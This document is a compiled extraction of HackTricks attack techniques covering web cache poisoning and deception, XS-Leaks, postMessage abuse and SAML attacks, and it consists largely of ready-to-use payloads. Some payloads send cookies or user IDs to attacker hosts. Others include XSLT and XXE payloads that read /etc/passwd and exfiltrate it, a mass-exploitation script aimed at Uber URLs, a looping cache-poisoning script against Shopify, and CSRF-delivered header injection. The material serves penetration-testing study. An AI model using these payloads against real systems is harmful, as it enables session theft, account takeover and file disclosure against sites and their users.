# HackTricks Batch 5: Cache Deception, XS-Leak, PostMessage, and SAML Attacks
# Full payload and technique extraction from four HackTricks articles

================================================================================
1. WEB CACHE POISONING & CACHE DECEPTION
   Source: /root/killer-queen-knowledge/hacktricks/pentesting-web-cache-deception.md
================================================================================

## 1.1 Cache Poisoning vs Cache Deception
- Cache Poisoning: Attacker stores MALICIOUS content in cache, served to other users.
- Cache Deception: Attacker causes cache to store SENSITIVE user content, then retrieves it.

## 1.2 Cache Poisoning Attack Steps
1. Identify UNKEYED INPUTS (params/headers not part of cache key but affect response)
2. Exploit those unkeyed inputs to modify the server response
3. Get the poisoned response CACHED

## 1.3 Discovery: HTTP Headers
- X-Cache: miss/hit
- Cache-Control: public, max-age=N
- Vary: additional headers that ARE part of cache key
- Age: seconds object has been in cache

## 1.4 Foundational Case Studies (Payloads)

### HackerOne global redirect via X-Forwarded-Host
```
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```

### GitHub repository DoS via Content-Type + PURGE
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```

### Shopify cross-host persistence loops
```python
import requests, time
for i in range(100):
    requests.get("https://shop.shopify.com/endpoint",
                 headers={"X-Forwarded-Host": "attacker.com"})
    time.sleep(0.1)
```

### JS asset redirect -> stored XSS chain
```
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

### GitLab static DoS via X-HTTP-Method-Override
```
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
(Returns cacheable 200 OK with Content-Length: 0, replacing JS bundle with empty body)

### HackerOne static asset loop via X-Forwarded-Scheme
```
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
(Triggers cacheable 301 HTTPS redirect loop)

### Cloudflare host-header casing mismatch
```
GET / HTTP/1.1
Host: TaRgEt.CoM
```
(Cloudflare normalizes for cache key but forwards raw casing to origin)

### Red Hat Open Graph meta poisoning
```
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```

## 1.5 Exploiting Examples (Payloads)

### Basic XSS via X-Forwarded-Host header reflection
```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

### Cookie-based XSS via cache poisoning
```
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```

### CDN Path Traversal (ChatGPT API key leak)
```
https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123
```
(CDN doesn't normalize %2F..%2F, caches /share/*, web server does normalize and returns /api/auth/session)

### Multiple header exploitation (X-Forwarded-Host + X-Forwarded-Scheme)
```
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```

### Fat GET (body parameter overrides URL parameter)
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

### Parameter Cloaking (Ruby ; separator)
- Ruby servers accept `;` instead of `&` for parameter separation
- Use to hide unkeyed params inside keyed ones

### Header-reflection XSS + CDN/WAF cache seeding
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
(First request: GET .js path with malicious UA; Immediately after: GET / — race condition seeds poisoned HTML)

### Sitecore pre-auth HTML cache poisoning
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>...payload...</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```

### CVE-2021-27577: Apache Traffic Server fragment forwarding
```
/#/../?r=javascript:alert(1)
```
(ATS forwards fragment and generates cache key without it)

### Injecting Keyed Parameters (URL-encoded duplicate)
- Send `siz%65` as URL-encoded duplicate of `size` param
- Cache uses `size` value for key; backend uses `siz%65` value

### Illegal Header Fields (RFC7230 tchar violation)
- Send header with invalid character like `\` → cacheable 400

## 1.6 Cache Deception Techniques (Payloads)

### Extension-based cache deception paths to test:
- www.example.com/profile.php/nonexistent.js
- www.example.com/profile.php/.js
- www.example.com/profile.php/.css
- www.example.com/profile.php/test.js
- www.example.com/profile.php/../test.js
- www.example.com/profile.php/%2e%2e/test.js
- Lesser known extensions: .avif

### CSPT-assisted authenticated cache poisoning (ATO)
1. Sensitive API endpoint (/v1/token) non-cacheable at origin
2. Append .css → GET /v1/token.css → CDN treats as static, caches response
3. SPA with CSPT: URL param injects ../../../v1/token.css into API path
4. Authenticated fetch goes to cacheable path, CDN caches victim's token
5. Anyone GETs /v1/token.css → retrieves cached token

```javascript
// CSPT in SPA
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');
const apiUrl = `https://api.example.com/v1/users/info/${userId}`;
fetch(apiUrl, { method: 'GET', headers: { 'X-Auth-Token': authToken } });
```
Exploit URL: https://example.com/user?userId=../../../v1/token.css

### Tools
- toxicache: Go scanner for cache poisoning
- CacheDecepHound: Python scanner for Cache Deception detection
- wcvs: Web Cache Vulnerability Scanner


================================================================================
2. XS-SEARCH / XS-LEAKS
   Source: /root/killer-queen-knowledge/hacktricks/pentesting-web-xs-search.md
================================================================================

## 2.1 Core Concepts
- XS-Search: Extracting cross-origin info via side channel vulnerabilities
- Components: Vulnerable Web, Attacker's Web, Inclusion Method, Leak Technique, States, Detectable Differences

### Detectable Differences:
- Status Code (200 vs 403 vs 500 etc.)
- API Usage (is a specific Web API used?)
- Redirects (JS/HTML navigations, not just HTTP)
- Page Content (body variations, frame counts, image sizes)
- HTTP Headers (X-Frame-Options, Content-Disposition, CORP, etc.)
- Timing (consistent time disparities)

### Inclusion Methods:
- HTML Elements: stylesheets, images, scripts (https://github.com/cure53/HTTPLeaks)
- Frames: iframe, object, embed
- Pop-ups: window.open
- JavaScript Requests: fetch, XHR

### Leak Techniques:
- Event Handlers (onload/onerror)
- Error Messages (JS exceptions, error pages)
- Global Limits (browser memory, connection limits)
- Global State (History interface)
- Performance API (network timing, resource entries)
- Readable Attributes (window.length cross-origin)

## 2.2 Timing-Based Techniques
- Clocks: performance.now(), Broadcast Channel API, Message Channel API, requestAnimationFrame, setTimeout, CSS animations
- Explicit timing vs implicit timing clocks

## 2.3 Event Handler Techniques (Payloads)

### Onload/Onerror (Status Code Oracle)
```javascript
// Load scripts, objects, stylesheets, images, audio
// onload = success, onerror = failure
```
Script-less version:
```html
<object data="//example.com/404">
  <object data="//attacker.com/?error"></object>
</object>
```

### Content-Type/CORB Script Load Oracle
- Endpoint returns HTML on match, JSON on mismatch
- `<script src>` loads HTML → onload; JSON → CORB-blocked → onerror
- Boolean oracle to brute-force identifiers (e.g., __user)

### postMessage vs X-Frame-Options Deny Oracle
```html
<iframe id=fb width=0 height=0></iframe>
<script>
function test(id){
  fb.src=`https://www.facebook.com/plugins/like.php?__a=1&__user=${id}`;
  return new Promise(r=>{
    const t=setTimeout(()=>r(false),2000);
    onmessage=()=>{clearTimeout(t);r(true);}
  });
}
</script>
```
(XFO:deny = no message; success = postMessage emitted)

### Onload Timing
```javascript
// Measure duration with performance.now() before/after onload
// Also: PerformanceLongTaskTiming API (>50ms tasks)
```

### Sandboxed Frame Timing + onload
```javascript
// iframe with sandbox attribute — no JS execution, pure network timing
<iframe src="example.html" sandbox></iframe>
```

### #ID + error + onload (Hash-Change Oracle)
- Change only URL hash between requests
- If page loaded successfully, onload NOT retriggered on hash change
- If page had error, onload IS retriggered
- Distinguish correct load vs error without timing

### Javascript Execution (Script Pollution)
- If page returns sensitive content OR attacker-controlled content
- Set valid JS code in negative case, load via `<script>` tags
- Negative: attacker code executes; Affirmative: nothing happens

### CORB - Onerror
- CORB: strips body+headers for protected Content-Type + nosniff + 2xx
- Detects: Status Code + Content-Type combination

### onblur (ID/name attribute leak)
- Load page in iframe with `#id_value` → focuses element
- `onblur` signal triggered → ID element exists
- Also works with `<portal>` tags

### postMessage Broadcasts
```javascript
// Listen for all postMessages
// Presence/absence = oracle for user state (logged in vs not)
```

## 2.4 Global Limits Techniques (Payloads)

### WebSocket API Limit
- Exhaust WebSocket connections → count exceptions = target's WS count
- Detects app states tied to WebSocket connection count

### Payment API
- Only one Payment Request active at a time
- Try to show Payment API UI → exception = target is using it

### Timing the Event Loop
- JS single-threaded event loop
- Dispatch events, measure delays → infer cross-origin execution time
```
Event Loop Blocking + Lazy images
```

### Busy Event Loop
- Block event loop intentionally, time until it becomes available
- Can circumvent Site Isolation

### Connection Pool (Socket Exhaustion)
1. Determine browser socket limit (e.g., 256)
2. Occupy 255 sockets with long-running requests
3. Use 256th for target page
4. Attempt 257th request → queued until socket frees
5. Delay before 257th = target page network timing

### Connection Pool by Destination
- Chrome limit: 6 concurrent to same origin
- Block 5, launch 6th → measure timing
- If victim page sends more requests, 6th takes longer

## 2.5 Performance API Techniques (Payloads)

### Error Leak
- Requests resulting in errors do NOT create performance entries
- Detect status codes (error vs success)

### Style Reload Error (GC bug)
- Failed resources loaded twice → multiple performance entries

### Request Merging Error
- Error responses cannot be merged → detectable

### Empty Page Leak
- Empty responses do NOT create performance entries

### XSS-Auditor Leak (SA only)
- Pages blocked by XSS Auditor → no performance entries

### X-Frame Leak
- Pages with X-Frame-Options → no performance entry in iframe/embed

### Download Detection
- Content-Disposition: attachment → no performance entry
- Detect downloads

### Redirect Start Leak (SA)
- redirectStart timing data exposed cross-origin

### Duration Redirect Leak (GC)
- Redirect responses: negative duration → distinguishable

### CORP Leak
- CORP-protected resources: empty nextHopProtocol (GC) / no entry (SA)

### Service Worker Cache Detection
- Resource loaded from SW cache detectable via Performance API

### Cache Detection via Performance API
- Check if resource is cached using timing in performance entries

### Network Duration
- Retrieve network duration of cross-origin requests from performance API

## 2.6 Error Messages Techniques (Payloads)

### Media Error (Firefox)
```javascript
// MediaError.message differs between success and error states
// Success: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed" (Chrome)
// Success: "Failed to init decoder" (Firefox)
// Error: different message
```

### CORS Error (SA)
- CORS error messages expose full URL of redirected requests (Webkit)

### SRI Error (SA)
- Verbose SRI error messages reveal content length
- Trigger with bogus integrity hash

### CSP Violation/Detection
- Allow target domain in CSP; if it redirects cross-origin → CSP violation
- Violation report may leak redirect target (browser-dependent)

### Cache Probing (Cache-based XS-Leak)
1. Clear resource from cache
2. Load target page (may cache resource)
3. Try loading resource with bad request (overlong referrer)
4. No error → was cached → target page loaded it

### CSP Directive Leak
```html
<!-- iframe with csp attribute; if already governed by CSP and new policy not more restrictive, page loads normally -->
<!-- Error page indicates specific CSP directive presence -->
```

### CORP Detection
- CORP-protected resources throw error when fetched cross-origin

### CORB nosniff Detection
- Detect presence of `nosniff` header via CORB behavior

### CORS Error on Origin Reflection (Cache State Probe)
- If Origin reflected in Access-Control-Allow-Origin:
  - Fetch in CORS mode; no error = from web; error = from cache
  - (Cache saves response with original domain's CORS header)

## 2.7 Readable Attributes Techniques (Payloads)

### Fetch Redirect
```javascript
// Fetch with redirect: "manual"
// response.type === "opaqueredirect" → response was a redirect
```

### COOP Leak
- contentWindow reference accessible? → no COOP
- opener property undefined → COOP active; defined → no COOP

### URL Max Length - Server Side
- Fill user input to (server limit - 1)
- If redirect adds extra data → exceeds limit → error (detectable via Error Events)
- Cookie bomb variant: set massive cookies to push response over size limit
- SameSite=None or same context needed

### URL Max Length - Client Side (Chrome 2MB)
- Chrome limit: 2MB max URL length
- If redirect URL > 2MB → `about:blank#blocked` page
- window.origin throws error for cross-origin AFTER redirect
- window.origin ACCESSIBLE if page is about:blank#blocked (parent origin)
- Add junk via hash to reach 2MB

### Max Redirects
- Browser redirect limit (usually 20)
- 19 redirects + 1 target → error = target tried to redirect

### History Length
```javascript
// Navigate to page, change back to same-origin
// Check history.length change → detect navigations/redirects
```

### History Length with Same URL
```javascript
async function debug(win, url) {
  win.location = url + "#aaa"
  win.location = "about:blank"
  await new Promise((r) => setTimeout(r, 500))
  return win.history.length
}
// length increased = URL matched (no reload needed)
// length unchanged = tried to load different URL
```

### Frame Counting
```javascript
// window.length → count iframes in page
// PDF detection: embed used internally
```

### HTMLElements (Media Dimensions)
- HTMLMediaElement: duration, buffered times
- HTMLVideoElement: videoHeight, videoWidth, webkit*DecodedByteCount, webkitDecodedFrameCount
- getVideoPlaybackQuality(): totalVideoFrames
- HTMLImageElement: height, width (0 if invalid), image.decode() rejection

### CSS Property Leak
```javascript
// Cross-origin CSS via <link> → rules applied to attacker page
// window.getComputedStyle → read CSS properties → detect user state
```

### CSS History (:visited)
- :visited selector detection via mix-blend-mode user interaction trick
- Rendering timing differences between visited/unvisited links

### ContentDocument X-Frame Leak (Chrome)
- XFO in object element → error page
- object.contentDocument = empty document (not null) → uniquely detectable in Chrome

### Download Detection
- Download bar monitoring: window height changes
- iframe download: no navigation event if Content-Disposition: attachment
- window.open download: no navigation if download triggered

### Partitioned HTTP Cache Bypass
- Cache key: (top-level eTLD+1, frame eTLD+1, URL)
- If resource from same eTLD+1, caching key matches top-level navigation
- Faster cache access detectable via timing (navigate+abort, or fetch timing)

### Fetch with AbortController (Cache Probing)
```javascript
// setTimeout + AbortController to interrupt fetch
// Error triggered = not cached; no error = cached
```

### Script Pollution (Prototype Hooks)
```html
<script>
Function.prototype.default=(e)=>{if(typeof e.userID==="string")fetch("//attacker.test/?id="+e.userID)}
Function.prototype.__esModule=1
</script>
<script src="https://www.facebook.com/signals/iwl.js?pixel_id=PIXEL_ID"></script>
```
- Hook Function.prototype to capture module-scoped data from cross-origin scripts
- Also serves as login-state oracle

### Service Workers (Execution Timing)
- Register SW on attacker domain
- Open target in new window, start timer
- Navigate to SW-controlled page → 204 No Content → timer captures execution time

## 2.8 HTML/Re-Injection Techniques (Payloads)

### Image Lazy Loading
```html
<img src=/something loading=lazy >
```
- Add junk chars (thousands of "W"s) or `<br><canvas height="1850px"></canvas><br>` to push content down
- Image only loads if injection is BEFORE the secret (within viewport)

### Scroll-to-text-fragment
```
https://victim.com/post.html#:~:text=SECR
```
- Bot scrolls to text matching "SECR"
- If secret matches, image below loads → oracle for char-by-char exfiltration
- Code: https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e

### Image Lazy Loading Time Based
- If image loads, subsequent requests take longer
- Measure timing instead of external callback

### CSS ReDoS
```javascript
// jQuery(location.hash) selector complexity timing
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```

## 2.9 Tools
- XSinator: https://xsinator.com/
- XSinator Paper: https://xsinator.com/paper.pdf
- xsleaks.dev wiki: https://xsleaks.dev/
- HTTPLeaks (HTML element list): https://github.com/cure53/HTTPLeaks


================================================================================
3. POSTMESSAGE VULNERABILITIES
   Source: /root/killer-queen-knowledge/hacktricks/pentesting-web-postmessage-vulnerabilities.md
================================================================================

## 3.1 Send PostMessage (Payloads)

```javascript
// PostMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

// PostMessage to an iframe with id "idframe"
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

// PostMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

// PostMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

// PostMessage to specific URL (targetOrigin restricted)
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

// PostMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
// loop until win.length == 1
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```

## 3.2 Attacking iframe & wildcard in targetOrigin
- If page can be iframed (no X-Frame-Header) AND sends postMessage with wildcard `*`
- Modify iframe origin to attacker domain → leak sensitive message

```html
<html>
   <iframe src="https://docs.google.com/document/ID" />
   <script>
      setTimeout(exp, 6000);
      function exp(){
          setInterval(function(){
              window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
          }, 100);
      }
   </script>
```

## 3.3 addEventListener Exploitation

### Typical vulnerable pattern:
```javascript
window.addEventListener("message", (event) => {
    if (event.origin !== "http://example.org:8080") return
    // ... sensitive operation ...
}, false)
```
If origin check is MISSING, attacker can make victims send arbitrary data.

### Enumeration Methods:
- Search JS code: `window.addEventListener`, `$(window).on` (jQuery)
- Console: `getEventListeners(window)`
- DevTools: Elements → Event Listeners
- Extensions: posta (https://github.com/benso-io/posta), postMessage-tracker

## 3.4 Origin Check Bypasses (Payloads)

### indexOf() bypass:
```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")  // returns 0 (match!)
```

### search() regex bypass (dot = wildcard):
```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")  // dot matches any char
```

### match() regex bypass:
- Similar to search(), improper regex structure can be bypassed

### escapeHtml bypass (prototype pollution via Error/File objects):
```javascript
// Expected to be escaped:
result = u({ message: "'\"<b>\\" })   // correctly escaped
// Bypass:
result = u(new Error("'\"<b>\\"))      // NOT escaped (read-only properties)
```
File object's read-only `name` property also bypasses escapeHtml

### document.domain relaxation:
- document.domain can be set to shorten domain → relaxed SOP

## 3.5 Origin-only trust + trusted relays
- If only event.origin is checked (e.g., trusts *.trusted.com)
- Find relay page on trusted origin that echoes attacker params via postMessage
- Marketing/analytics gadgets taking query params → forward to opener/parent

Abuse pattern:
```javascript
// Analytics SDK consumes IWL_BOOTSTRAP, calls backend with attacker-supplied token
// token's request history leaks OAuth codes from victim's location.href/document.referrer
```

Hunting: enumerate postMessage listeners checking only event.origin, look for same-origin endpoints forwarding URL params via postMessage.

## 3.6 e.origin == window.origin bypass (Null Origin)

```html
<iframe sandbox="allow-popups" src="...">
  <!-- Iframe origin = null -->
  <!-- Popup opened from sandboxed iframe: origin also = null -->
  <!-- null == null → e.origin == window.origin passes -->
</iframe>
```
Requires: sandbox attribute with allow-popups; WITHOUT allow-popups-to-escape-sandbox

## 3.7 Bypassing e.source
```javascript
// Typical check:
if (received_message.source !== window) { return }
```
Bypass: create iframe that sends postMessage, immediately DELETE the iframe → e.source becomes null

## 3.8 X-Frame-Header Bypass
```javascript
// Open new tab instead of iframe
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
```

## 3.9 Stealing Messages

### Block main page to steal postMessage to child:
- Block main page before sending data
- XSS in child iframe to leak data before received

### Modify iframe location to steal wildcard postMessage:
- If page has iframe receiving wildcard postMessage
- Change child iframe location to attacker-controlled → steal message

## 3.10 postMessage to Prototype Pollution and/or XSS
```html
<html>
  <body>
    <iframe id="iframe_victim" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
      function get_code() {
        document.getElementById("iframe_victim")
          .contentWindow.postMessage(
            '{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
            "*"
          )
        document.getElementById("iframe_victim")
          .contentWindow.postMessage(JSON.stringify("refresh"), "*")
      }
      setTimeout(get_code, 2000)
    </script>
  </body>
</html>
```

## 3.11 Origin-derived Script Loading & Supply-chain Pivot (CAPIG)
- capig-events.js registered handler only when window.opener exists
- IWL_BOOTSTRAP: checked pixel_id, stored event.origin, later used to build `${host}/sdk/${pixel_id}/iwl.js`
- Attacker sends IWL_BOOTSTRAP from any origin → persists attacker host in localStorage
- SDK loads attacker JS from CSP-allowed origins → XSS → ATO

```javascript
// Handler stores attacker-controlled origin:
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
  pixelID: event.data.pixel_id,
  host: event.origin,  // Attacker's origin!
  sessionStartTime: event.data.session_start_time,
})
startIWL() // loads ${host}/sdk/${pixel_id}/iwl.js from attacker host
```

## 3.12 Trusted-origin allowlist isn't a boundary
- Partner origin XSS → bridge into parent
- Parent trusts partner.com origin → partner iframe compromised → sends allowed message type with HTML → parent innerHTML = DOM XSS

```javascript
// Parent:
window.addEventListener("message", (e) => {
  if (e.origin !== "https://partner.com") return
  const [type, html] = e.data.split("|")
  if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})

// Compromised partner iframe:
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">

// Attacker page → compromised iframe → parent:
postMessage({
  cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```

## 3.13 Predicting Math.random() callback tokens
- GUID generation: `"f" + (Math.random() * (1<<30)).toString(16).replace(".", "")`
- Leak PRNG via iframe window.name (auto-named with guid())
- Force reinit for more PRNG outputs (XFBML.parse recreates iframes)
- Feed iframe names into V8 Math.random predictor (Z3-based)
- Forge callback tokens → DOM XSS via iconSVG injection

```javascript
// Forged message:
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload = callback + "&type=mpn.setupIconIframe&frameName=x" +
  "&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?...`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```

## 3.14 Key Tools
- posta: https://github.com/benso-io/posta
- postMessage-tracker: https://github.com/fransr/postMessage-tracker
- eventlistener-xss-recon: https://github.com/yavolo/eventlistener-xss-recon
- V8 Math.random predictor: https://github.com/PwnFunction/v8-randomness-predictor


================================================================================
4. SAML ATTACKS
   Source: /root/killer-queen-knowledge/hacktricks/pentesting-web-saml-attacks.md
================================================================================

## 4.1 Tools
- SAMLExtractor: https://github.com/fadyosman/SAMLExtractor
- SAML Raider (Burp extension): https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e

## 4.2 XML Round-Trip Vulnerability
- XML parsing/serialization changes document structure
- Signed data != data consumed by application

Example (REXML 3.2.4 bug):
```ruby
require 'rexml/document'
doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
  <Y/><![CDATA[--><X><Z/><!--]]]>
</X>
XML
puts "First child in original doc: " + doc.root.elements[1].name  # Y
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name  # Z
```

## 4.3 XML Signature Wrapping Attacks (XSW #1-#8)

### XSW #1: New root element containing signature
- Add evil new Response with signature → validator confused between legitimate and attacker's Subject

### XSW #2: Detached signature instead of enveloping
- Similar to #1 but uses detached signature

### XSW #3: Evil Assertion at same level as original
- Duplicate Assertion at same hierarchy level → confuse business logic

### XSW #4: Original Assertion as child of duplicate
- Evil Assertion wraps original → original becomes child of duplicate

### XSW #5: Copied Assertion envelopes Signature
- Neither Signature nor original Assertion follow standard configs (enveloped/enveloping/detached)

### XSW #6: Copied Assertion → Signature → Original Assertion (nested)
- Three-level nesting: copied Assertion envelopes Signature, Signature envelopes original

### XSW #7: Extensions element with copied Assertion
- Exploit less restrictive Extensions element schema
- Bypass schema validation in OpenSAML

### XSW #8: Variant of XSW #7 with reversed structure
- Original Assertion becomes child of less restrictive element

Tool: SAML Raider (Burp) can apply all XSW attacks automatically.

## 4.4 CVE-2024-45409: Ruby-SAML Signature Verification Bypass

Flow:
1. Capture legitimate SAMLResponse from IdP
2. Decode: URL decode → Base64 decode → raw inflate
3. Patch IDs/NameID/conditions, rewrite signature references/digests
4. Re-encode: raw deflate → Base64 → URL encode
5. Replay to SAML callback endpoint → auth as arbitrary user

```bash
python3 CVE-2024-45409.py -r response.url_base64 -n admin@example.com -o response_patched.url_base64
```

## 4.5 XXE via SAML
SAML Responses are deflated, base64-encoded XML documents.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
  <saml:Issuer>...</saml:Issuer>
  <ds:Signature ...>
    <ds:SignedInfo>
      <ds:CanonicalizationMethod .../>
      <ds:SignatureMethod .../>
      <ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
</samlp:Response>
```

## 4.6 XSLT via SAML
XSLT transformations happen BEFORE signature verification — self-signed/invalid signature sufficient.

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

## 4.7 XML Signature Exclusion
- Remove all Signature elements from SAML Response
- If signature validation not required → can alter verified content
- Test with SAML Raider: Intercept → Remove Signatures → Forward

## 4.8 Certificate Faking
1. Intercept SAML Response
2. Send certificate to SAML Raider Certs
3. Save and Self-Sign → create self-signed clone
4. Select new self-signed certificate in XML Signature dropdown
5. Remove existing signatures
6. (Re-)Sign Message or (Re-)Sign Assertion
7. Forward → successful auth = SP doesn't validate certificate trust chain

## 4.9 Token Recipient Confusion / SP Target Confusion
- Intercept SAML Response intended for SP-Legit (where you have valid account)
- Replay to SP-Target (different SP accepting same IdP)
- If SP-Target doesn't validate Recipient in SubjectConfirmationData → gain access with same identity

```python
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
    # Send intercepted SAML Response to different SP
    pass
```

## 4.10 XSS in Logout Functionality

Uber SAML logout example:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=javascript:alert(123);&return_to=...&splash_disabled=1
```
- `base` parameter accepts URL → inject javascript: URL

Mass exploitation:
```python
import requests
with open("/home/fady/uberSAMLOIDAUTH") as urlList:
    for url in urlList:
        url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
        request = requests.get(url2, allow_redirects=True, verify=False)
        if ("Fady" in request.content):
            print("Vulnerable: " + url2)
```

## 4.11 RelayState-based Header/Body Injection to rXSS

Concept:
```
\n
Content-Type: text/html

\n

<svg/onload=alert(1)>
```

URL-encode: `%0AContent-Type%3A+text%2Fhtml%0A%0A%0A%3Csvg%2Fonload%3Dalert(1)%3E`

Base64-encode: `DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FkPWFsZXJ0KDEpPg==`

Exploit:
```http
POST /cgi/logout HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

SAMLResponse=[BASE64-Generic-SAML-Response]&RelayState=DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FkPWFsZXJ0KDEpPg==
```

CSRF delivery:
```html
<form action="https://target/cgi/logout" method="POST" id="p">
  <input type="hidden" name="SAMLResponse" value="[BASE64-Generic-SAML-Response]">
  <input type="hidden" name="RelayState" value="DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzdmcvb25sb2FkPWFsZXJ0KDEpPg==">
</form>
<script>document.getElementById('p').submit()</script>
```

## 4.12 Key References
- SAML methodology: https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/
- Part 2: https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/
- Part 3: https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/
- CVE-2024-45409 PoC: https://github.com/synacktiv/CVE-2024-45409
- Ruby-SAML advisory: https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-jw9c-mfg7-9rx2
- XML round-trip: https://mattermost.com/blog/securing-xml-implementations-across-the-web/
- SAML insecure by design: https://joonas.fi/2021/08/saml-is-insecure-by-design/
